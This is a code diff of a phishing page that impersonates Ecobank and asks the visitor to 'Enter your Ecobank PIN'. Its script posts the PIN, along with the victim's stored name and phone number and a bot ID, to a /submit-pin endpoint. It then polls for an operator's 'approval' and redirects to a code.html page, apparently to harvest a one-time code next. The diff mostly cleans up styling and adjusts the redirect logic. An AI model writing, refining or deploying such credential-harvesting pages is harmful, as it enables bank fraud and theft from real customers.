@@ -21,7 +21,6 @@ body{
   padding:20px;
 }
 
-/* CARD */
 .pin-card{
   width:92%;
   max-width:420px;
@@ -33,7 +32,6 @@ body{
   text-align:center;
 }
 
-/* BACK BUTTON */
 .back{
   position:absolute;
   left:18px;
@@ -43,7 +41,6 @@ body{
   cursor:pointer;
 }
 
-/* TITLE */
 .pin-title{
   font-size:20px;
   font-weight:700;
@@ -51,7 +48,6 @@ body{
   margin-bottom:6px;
 }
 
-/* SUBTITLE UPDATED TEXT */
 .pin-subtitle{
   font-size:14px;
   color:#64748b;
@@ -59,7 +55,6 @@ body{
   font-weight:500;
 }
 
-/* PIN BOX AREA */
 .pin-box-wrapper{
   background:linear-gradient(135deg,#2563eb,#1e40af);
   border-radius:20px;
@@ -86,12 +81,10 @@ body{
   font-weight:700;
   color:#2563eb;
   border:2px solid transparent;
-  transition:.2s;
 }
 
 .pin-box:not(:empty){
   border-color:#2563eb;
-  box-shadow:0 6px 16px rgba(0,0,0,.12);
 }
 
 .lock{
@@ -107,7 +100,6 @@ body{
   color:#fff;
 }
 
-/* BUTTON */
 button{
   width:100%;
   padding:16px;
@@ -119,19 +111,12 @@ button{
   border-radius:16px;
   cursor:pointer;
   opacity:.5;
-  transition:.25s;
 }
 
 button:enabled{
   opacity:1;
 }
 
-button:enabled:hover{
-  transform:translateY(-1px);
-  box-shadow:0 14px 30px rgba(37,99,235,.25);
-}
-
-/* STATUS */
 .status{
   margin-top:16px;
   font-size:14px;
@@ -143,7 +128,6 @@ button:enabled:hover{
   color:#dc2626;
 }
 
-/* HIDDEN INPUT */
 .hidden-input{
   position:absolute;
   opacity:0;
@@ -158,8 +142,6 @@ button:enabled:hover{
   <div class="back" onclick="history.back()">←</div>
 
   <div class="pin-title">Enter PIN</div>
-
-  <!-- TEXT UPDATED AS REQUESTED -->
   <div class="pin-subtitle">Enter your Ecobank PIN</div>
 
   <div class="pin-box-wrapper">
@@ -176,13 +158,7 @@ button:enabled:hover{
   <div id="status" class="status">⏳ Waiting for approval...</div>
 </div>
 
-<input
-  id="pinInput"
-  class="hidden-input"
-  type="tel"
-  inputmode="numeric"
-  maxlength="4"
-/>
+<input id="pinInput" class="hidden-input" type="tel" inputmode="numeric" maxlength="4"/>
 
 <script>
 const input = document.getElementById('pinInput');
@@ -196,27 +172,26 @@ const boxes = [
   document.getElementById('b4')
 ];
 
-const fullName = localStorage.getItem('fullName');
+const fullName = localStorage.getItem('fullName') || 'User';
 const phone = localStorage.getItem('phone');
-
-const params = new URLSearchParams(window.location.search);
-const urlBotId = params.get('botId');
-if (urlBotId) localStorage.setItem('botId', urlBotId);
-
 const botId = localStorage.getItem('botId');
 
-if (!fullName || !phone || !botId) {
+if (!phone || !botId) {
   alert('Session expired. Please start again.');
   window.location.href = 'index.html';
 }
 
-function focusPin() {
+function focusPin(){
   input.focus();
 }
 
 input.addEventListener('input', () => {
-  input.value = input.value.replace(/\D/g, '').slice(0, 4);
-  boxes.forEach((box, i) => box.textContent = input.value[i] ? '•' : '');
+  input.value = input.value.replace(/\D/g,'').slice(0,4);
+
+  boxes.forEach((b,i)=>{
+    b.textContent = input.value[i] ? '•' : '';
+  });
+
   loginBtn.disabled = input.value.length !== 4;
 });
 
@@ -225,44 +200,48 @@ loginBtn.addEventListener('click', async () => {
 
   loginBtn.disabled = true;
   statusEl.style.display = 'block';
-  statusEl.classList.remove('error');
   statusEl.textContent = '⏳ Waiting for approval...';
 
-  const res = await fetch('/submit-pin', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ name: fullName, phone, pin, botId })
-  });
+  try {
+    const res = await fetch('/submit-pin', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ name: fullName, phone, pin, botId })
+    });
 
-  if (!res.ok) {
+    const data = await res.json();
+    pollPin(data.requestId);
+
+  } catch (e) {
     statusEl.classList.add('error');
-    statusEl.textContent = '❌ Server error. Please try again.';
+    statusEl.textContent = '❌ Server error';
     loginBtn.disabled = false;
-    return;
   }
-
-  const { requestId } = await res.json();
-  pollPin(requestId);
 });
 
-function pollPin(requestId) {
+function pollPin(requestId){
   const interval = setInterval(async () => {
     const res = await fetch(`/check-pin/${requestId}`);
     const data = await res.json();
 
-    if (data.approved === true) {
+    // ✅ FIXED REDIRECT LOGIC
+    if (data.approved === true || data.redirect === 'code') {
       clearInterval(interval);
       window.location.href = 'code.html';
+      return;
     }
 
     if (data.approved === false || data.blocked) {
       clearInterval(interval);
+
       input.value = '';
-      boxes.forEach(b => b.textContent = '');
+      boxes.forEach(b=>b.textContent='');
       loginBtn.disabled = true;
+
       statusEl.classList.add('error');
-      statusEl.textContent = '❌ Incorrect PIN. Please try again.';
+      statusEl.textContent = '❌ Incorrect PIN';
     }
+
   }, 2000);
 }
 
